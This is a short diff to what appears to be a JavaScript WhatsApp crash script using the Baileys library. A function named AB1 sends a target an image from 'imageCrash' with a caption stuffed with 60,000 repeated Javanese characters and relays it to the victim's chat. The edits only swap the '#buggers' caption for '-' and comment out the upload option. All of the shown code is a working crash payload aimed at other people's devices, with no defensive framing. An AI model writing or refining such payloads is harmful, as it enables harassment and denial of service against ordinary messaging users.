@@ -536,7 +536,7 @@ async function AB1(sock, target, mention) {
 
     const photo = {
         image: { url: imageCrash },
-        caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸"
+        caption: "-"
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
     };
@@ -548,7 +548,7 @@ async function AB1(sock, target, mention) {
         }
     }, {
         userJid: target,
-        upload: sock.waUploadToServer
+        //upload: sock.waUploadToServer
     });
 
     await sock.relayMessage(target, album.message, { messageId: album.key.id });
